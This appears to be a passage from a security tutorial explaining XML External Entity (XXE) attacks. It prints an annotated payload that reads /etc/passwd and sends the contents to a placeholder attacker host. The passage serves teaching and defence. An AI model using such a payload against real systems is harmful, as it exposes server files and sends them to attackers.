Attackers can exploit how an application parses eXtensible
Markup Language (XML) by taking advantage of an XML
External Entity (XXE) vulnerability. More specifically, it
involves exploiting how the application processes the
inclusion of external entities in its input. You can use an XXE
to extract information from a server or to call on a malicious
server.

```
<?xml version=“1.0” encoding=“UTF-8”?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
➊ <!ENTITY % xxe SYSTEM “file:///etc/passwd” >
➋ <!ENTITY callhome SYSTEM ➌“www.malicious.com/?%xxe;”>
]
>
<foo>&callhome;</foo>
```
